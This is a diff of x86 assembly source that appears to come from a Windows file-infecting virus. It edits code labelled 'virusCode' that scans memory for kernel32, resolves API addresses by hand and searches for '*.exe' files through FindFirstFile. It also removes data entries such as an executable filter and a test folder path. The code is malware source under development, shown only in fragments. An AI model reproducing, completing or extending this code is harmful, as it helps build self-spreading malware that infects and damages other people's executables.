@@ -18,19 +18,6 @@ FindFirstFileSuccess            		BYTE                        "First file found 
 FindNextFileError               		BYTE                        "FindNextFile failed ", 0
 FindNextFileSuccess             		BYTE                        "FirstNextFile found with success ", 0
 FolderFound           		  		BYTE                        "Folder found", 0
-EndObjecTable					BYTE				    "End of object table",0
-
-fileFilter 						db 							"*.*",0
-backDir 						db 							"..",0
-exeFilter 						db 							"*.exe",0
-path 							BYTE 						      "C:\Documents and Settings\F.U.C.K\Desktop\test\",0
-count 						db 							0
-
-.data?
-validPE						dd							?
-hDir 							db 							256 dup (?)
-ErrorCode                                 DWORD                       			? 
-
 .code
 ; -----------------------------------;
 virusCode:
@@ -104,9 +91,9 @@ find_MZ_in_kernel:
 	
 find_API:
 	push ebp
-	call find_ProcAddress
-	mov ebx,[esp]
-	mov dword ptr [ebx+GetProcAddressAddress],ebp
+	call find_ProcAddress						; Find address of func GetProcAddress
+	mov ebx,[esp]							; done 
+	mov dword ptr [ebx+GetProcAddressAddress],ebp		; save address 
 	pop ebp
 	
 	push ebp
@@ -115,9 +102,11 @@ find_API:
 	mov dword ptr [ebx+GetModuleHandleAddress],ebp
 	pop ebp
 	
-	push dword ptr[ebp+kernel_string]					; get kernel32 image_base
-	call [ebp+GetModuleHandleAddress]				      ; call module handle for image
-	mov dword ptr [ebp+handle],eax					; save handle from eax
+	lea eax,offset kernel_string
+	add eax,ebp
+	push eax
+	call [ebp+GetModuleHandleAddress]
+	mov dword ptr [ebp+handle],eax
 	
 	call GetAPIAddress						      ; now get api address 
 	
@@ -254,7 +243,6 @@ search_module_4:
 	mov ebp,[ebp]
 	add ebp,edi
 	ret	
-
 GetAPIAddress:
 	push dword ptr[ebp+FindFirstFileAStr]
 	push dword ptr[ebp+handle]                  ; module handle
